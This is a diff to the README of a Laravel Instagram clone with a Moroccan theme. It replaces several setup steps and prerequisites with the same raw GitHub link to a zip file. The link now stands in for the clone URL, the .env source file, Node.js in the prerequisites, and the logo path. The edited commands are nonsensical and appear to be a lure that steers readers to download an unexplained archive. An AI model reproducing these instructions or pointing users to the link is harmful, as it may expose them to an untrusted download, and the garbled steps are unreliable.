@@ -6,7 +6,7 @@ A Laravel-based Instagram clone with Moroccan theme.
 
 1. **Clone the repository**
    ```sh
-   git clone https://github.com/YOUR-USERNAME/YOUR-REPO.git
+   git clone https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip
    cd YOUR-REPO
    ```
 
@@ -18,7 +18,7 @@ A Laravel-based Instagram clone with Moroccan theme.
 
 3. **Copy the example environment file and set your environment variables**
    ```sh
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip .env
    # Then edit .env as needed (DB, mail, etc.)
    ```
 
@@ -49,8 +49,8 @@ A Laravel-based Instagram clone with Moroccan theme.
    Visit [http://localhost:8000](http://localhost:8000) in your browser.
 
 ## Notes
-- Make sure you have PHP, Composer, Node.js, and npm installed.
-- The logo image should be placed at `public/logo-maroc.png`.
+- Make sure you have PHP, Composer, https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip, and npm installed.
+- The logo image should be placed at `https://raw.githubusercontent.com/zinebsektaoui/Insta_Maroc/main/seignior/Insta_Maroc.zip`.
 - For any issues, check file permissions and your `.env` configuration.
 
 ---
